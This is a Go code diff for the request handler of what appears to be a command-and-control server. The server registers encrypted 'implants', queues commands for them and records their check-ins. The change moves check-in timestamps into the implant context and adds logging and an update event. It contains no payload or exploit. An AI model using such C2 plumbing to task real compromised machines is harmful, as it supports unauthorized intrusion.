@@ -82,15 +82,15 @@ func ProcessRequest(c *gin.Context) {
 		} else { // if we're not registered, we need to register
 
 			NewImplant = &Common.Implant{
-				AESKey:      AESKey,
-				IV:          IV,
-				Alive:       true,
-				Context:     Common.ImplantContext{},
-				CmdQue:      Common.Queue{},
-				LastCheckin: time.Now(),
+				AESKey:  AESKey,
+				IV:      IV,
+				Alive:   true,
+				Context: Common.ImplantContext{},
+				CmdQue:  Common.Queue{},
 			}
 			//set the agent name before we add it to our array b/c it's part of the header package and not dedcrypted data.
 			NewImplant.Context.Agent_name = data_package.AgentName
+			NewImplant.Context.LastCheckin = time.Now()
 
 			//add the agent to the agent map
 			agent_map[data_package.AgentName] = NewImplant
@@ -118,15 +118,15 @@ func ProcessRequest(c *gin.Context) {
 			AgentCmd.DataBuffer = nil
 
 			agent = &Common.Implant{
-				AESKey:      nil,
-				IV:          nil,
-				Alive:       true,
-				Context:     Common.ImplantContext{},
-				CmdQue:      Common.Queue{},
-				LastCheckin: time.Now(),
+				AESKey:  nil,
+				IV:      nil,
+				Alive:   true,
+				Context: Common.ImplantContext{},
+				CmdQue:  Common.Queue{},
 			}
 			agent.CmdQue.PreemptQueue(AgentCmd)
 			agent.Context.Agent_name = data_package.AgentName
+			agent.Context.LastCheckin = time.Now()
 			agent_map[data_package.AgentName] = agent // create a temporary agent to hold the command
 		}
 
@@ -150,14 +150,14 @@ func ProcessRequest(c *gin.Context) {
 			AgentCmd.CmdID = Common.CMD_NO_JOB
 			AgentCmd.RequestID = data_package.RequestID + 1
 			c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
-			agent.LastCheckin = time.Now()
+			agent.Context.LastCheckin = time.Now()
 
 		} else if agent.CmdQue.Len() > 0 {
 			var (
 				value interface{}
 				ok    bool
 			)
-			agent.LastCheckin = time.Now()
+			agent.Context.LastCheckin = time.Now()
 			value, err = agent.CmdQue.Dequeue()
 
 			if err != nil {
@@ -166,6 +166,7 @@ func ProcessRequest(c *gin.Context) {
 			}
 			//TODO if there is multiple commands in the queue, we need to send them all
 			if AgentCmd, ok = value.(Common.AgentCmd); ok {
+				log.Println("[infp] sending command to agent: ", AgentCmd.CmdID, AgentCmd.RequestID, AgentCmd.DataBuffer)
 				c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
 			} else {
 				log.Println("[error] attempting to cast value to AgentCmd")
@@ -173,7 +174,8 @@ func ProcessRequest(c *gin.Context) {
 			}
 		}
 
-		break // CMD_GET_JOB
+		SendEvent("UpdateCheckin", agent.Context, agent.Alive) // update our last checkin no matter if we have a job to do or not.
+		break                                                  // CMD_GET_JOB
 
 	default:
 		break
